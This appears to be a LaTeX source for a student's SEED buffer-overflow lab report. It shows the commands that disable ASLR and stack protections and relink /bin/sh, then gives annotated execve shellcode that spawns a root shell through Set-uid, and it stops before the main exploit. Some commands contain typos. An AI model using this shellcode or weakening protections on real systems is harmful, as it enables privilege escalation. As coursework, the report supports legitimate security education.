\documentclass[14pt]{extarticle}

\usepackage{enumitem}
\usepackage{calc}
\usepackage{tikz}
\usepackage{listings}
\usepackage{color}
\usepackage{textcomp}
\definecolor{listinggray}{gray}{0.9}
\definecolor{lbcolor}{rgb}{0.9,0.9,0.9}
\lstset{
	backgroundcolor=\color{lbcolor},
	tabsize=4,
	rulecolor=,
	language=bash,
        basicstyle=\scriptsize,
        upquote=true,
        aboveskip={1.5\baselineskip},
        columns=fixed,
        showstringspaces=false,
        extendedchars=true,
        breaklines=true,
        prebreak = \raisebox{0ex}[0ex][0ex]{\ensuremath{\hookleftarrow}},
        frame=single,
        showtabs=false,
        showspaces=false,
        showstringspaces=false,
        identifierstyle=\ttfamily,
        %keywordstyle=\color[rgb]{0,0,1},
        commentstyle=\color[rgb]{0.133,0.545,0.133},
        stringstyle=\color[rgb]{0.627,0.126,0.941},
}

\usetikzlibrary{trees}
\parskip=.9ex
\textwidth=7.0in
\textheight=9.0in
\oddsidemargin=-.25in
\topmargin=-.75in

\begin{document}

\title{Buffer Overflows Classic}

\author{Zane Durkin\\
    University of Idaho}
\begin{description}[leftmargin=!, labelwidth=\widthof{\bfseries Author(s) Name(s)}]
\item [Year and Semester] 2018 FALL
\item [Course Number] CS-336
\item [Course Title] Intro. to Information Assurance
\item [Work Number] LA-01
\item [Work Name] Buffer Overflows Classic
\item [Work Version] Version 1
\item [Long Date] Wednesday, 24 October 2018
\item [Author(s) Name(s)] Zane Durkin
\end{description}
\begin{abstract}
In this article I will be explaining in detail the Tasks I preformed during the SEED security lab.
\end{abstract}

\section{Setting up Lab Environment}
In order to preform the classic stack overflow attack, some of the countermeasures will need to be disabled. These countermeasures (listed in sub sections below) are enabled in the Ubuntu operating system, and many others, by default. These security countermeasures are in place to make stack overflow attacks difficult \cite{seed-bof}.

\subsection{Address Space Randomization}
Address space Randomization is used to change the starting address of the heap and stack for every run of the program. This security mechanism makes guessing the address of your overflow attack difficult and unpredictable. To make this lab easier, I will disable this using the following command \cite{seed-bof}.
\begin{lstlisting}[language=bash]
	sudo -w kernel.randomize_va_space=0
\end{lstlisting}
This command will remove the randomization of the starting address for the heap and stack. This makes it much easier to figure out the address I need to use for my exploit, since it will be the same address every time I run my code.

\subsection{Non-Executable Stack}
By default gcc disables execution of code on the stack. However, since I will be placing my exploit code on the stack, I will need to be able to execute code on the stack for the exploit to work. So to allow for execution of things on the stack I will need to add a flag to gcc when compiling my vulnerable code \cite{seed-bof}.
To Execute code on the stack, my compile command will look like this \cite{seed-bof}:
\begin{lstlisting}[language=bash]
   gcc -z execstack -o test test.c
\end{lstlisting}
And for non-executable stack I can use the following command (although gcc does this by default) \cite{seed-bof}:
\begin{lstlisting}[language=bash]
   gcc -z nonexecstack -o test test.c
\end{lstlisting}

\subsection{Configuring /bin/sh}
For the current version of Ubuntu, the /bin/sh command is a symbolic link to the /bin/dash shell. In this newer version of Ubuntu (version 16.04) the dash shell has a measure that prevents running the program from a user id that is different than the one of the user who initially ran the program. This means it will prevent running it as root, if I am not root already (or any other user). In order to make the bufferoverflow useful for switching user accounts, I will need a shell that does not prevent running as a Set-uid program. ZSH is a shell that does not have this countermeasure, so it will make a great substitute for the dash shell. To swith the symbolic link of /bin/sh from dash to zsh, I will first need to remove the current symbolic link to dash \cite{seed-bof}:
\begin{lstlisting}[language=bash]
  sudo rm /bin/sh
\end{lstlisting}
Now I need to make a new symbolic link from /bin/sh to the zsh shell. This can be done as shown \cite{seed-bof}:
\begin{lstlisting}[language=bash]
  sudo ln -s /bin/zsh /bin/sh
\end{lstlisting}
So now that the command /bin/sh will create a zsh shell instead of the dash shell, I will be able to run shell as a set-uid program in my exploit.

\section{Task 1}
\subsection{Running Shellcode}
  Before I jump into running the attack, I first need to understand how the exploit code works, and what it will look like when in assembly code. To do this I will write the exploit code as a C program, and then compile and run it to see how it works. When I compile the following code, I will be able to use that assembly code in my exploit later on \cite{seed-bof}. 
\begin{lstlisting}[language=c]
#include <stdio.h>
int main() {
    char *name[2];
    name[0] = "/bin/sh";
    name[1] = NULL;
    execve(name[0], name, NULL);
}
\end{lstlisting}

I can take the assembly of the previous code (after it has been compiled) and place the assembly in a buffer of a new program. The assembly of the original shell code program above is much different than the assembly that is in the given call_shellcode program from the lab. This is most likely due to the changes in gcc since the release of this lab. 
To test the assembly code of the above program, I can create a program "call_shellcode" which will simulate an actual attack. I can place the assembly code of the previous program into a buffer in a new program. This new program will execute the code stored in a buffer by referencing to the buffer's location in memory as a function. Since the buffer is filled with executable hex code, the program will continue to execute the hex code as if it were a normal program \cite{seed-bof}.
The new program will look like this:
\begin{lstlisting}[language=c]
/* call_shellcode.c */
/* A program that launches a shell using shellcode */
// in order to run the execve function in the assembly code, I need to include a few libraries
#include <stdlib.h>
#include <stdio.h>
// the string library will help with holding the assembly code in a character array
#include <string.h>
const char code[] =
	// xor a register with it's self to clear it
    "\x31\xc0"       /* Line 1:     xorl       \%eax,\%eax        */
	// push the null value to the stack
    "\x50            /* Line 2:     pushl      \%eax             */
	// push the value "//sh" to the stack, double // is used to make 32 bit number
    "\x68""//sh"     /* Line 3:     pushl      \$0x68732f2f      */
	// push the value "/bin" to the stack
    "\x68""/bin"     /* Line 4:     pushl      \$0x6e69622f      */
	// copy location of the name[ 0 ] parameter to register ebx
    "\x89\xe3"       /* Line 5:     movl       \%esp,\%ebx        */
    // push another null value to the stack
    "\x50"           /* Line 6:     pushl      \%eax             */
	// push the ebx register to the stack
    "\x53"           /* Line 7:     pushl      \%ebx             */
	// copy location of name parameter to register ecx
    "\x89\xe1"       /* Line 8:     movl       \%esp,\%ecx        */
	// sets edx to zero. \cite{seed-bof}
    "\x99"           /* Line 9:     cdq                         */
	// copy the value of register al to 11
    "\xb0\x0b"       /* Line 10:    movb       \$0x0b,\%al        */
	// create an interrupt and execute code at location 0x80 (execve command)  \cite{intel-asm}
    "\xcd\x80"       /* Line 11:    int        \$0x80            */
;
int main(int argc, char **argv)
{
	// create a buffer to hold the assembly code
    char buf[sizeof(code)];
	// copy the code into the buffer
    strcpy(buf, code);
	// call the assembly code in the buffer as-if it were a function.
    ((void(*)( ))buf)( );
}
\end{lstlisting}
To test this program I will first need to compile it with the ability to execute code on the stack (as explained above):
\begin{lstlisting}[language=bash]
	gcc -z execstack -o call_shellcode call_shellcode.c
\end{lstlisting}
After compiling the program, It can be executed by running
\begin{lstlisting}[language=bash]
    ./call_shellcode
\end{lstlisting}
Running this program results in a new shell being created. The new shell is executed as the seed user, which is the user that ran the program. By receiving a shell from the program, I know that the assembly code works and that I am able to execute code that is placed on the stack\\
When running this program as root, the new shell is created with the root's permissions.
\begin{lstlisting}[language=bash]
    sudo ./call_shellcode
\end{lstlisting}
This command returns a shell which is logged in as the user root. This is because I'm running the call_shellcode command as the root user. By adding sudo (super user do) I'm changing my permissions, and thus when I receive the new shell, it has the same permissions.\\
The assembly in the embedded hex program works by pushing the location and name of the desired command into two variables, and then it sets a third variable (the parameters) to null. Once these  variables are set, the program calls the execve() function which executes the desired command. 

\subsection{Vulnerable Program}
Now that I have seen how a buffer can be filled with a hex value, which can then be executed, it's time to attempt this this attack on a vulnerable program. The vulnerable program that is given reads in a file (517 bytes) and sets it to a buffer of size 517 bytes. Next the program executes a function which copies the 517 byte array into a 24 byte buffer. This buffer can be overflowed if given enough bytes. 

To compile this program, gcc will need to allow execution of the stack and Stack Guard will need to be turned off. 

\newpage

\newpage
\bibliographystyle{ACM}
\bibliography{../../citations}
\end{document}
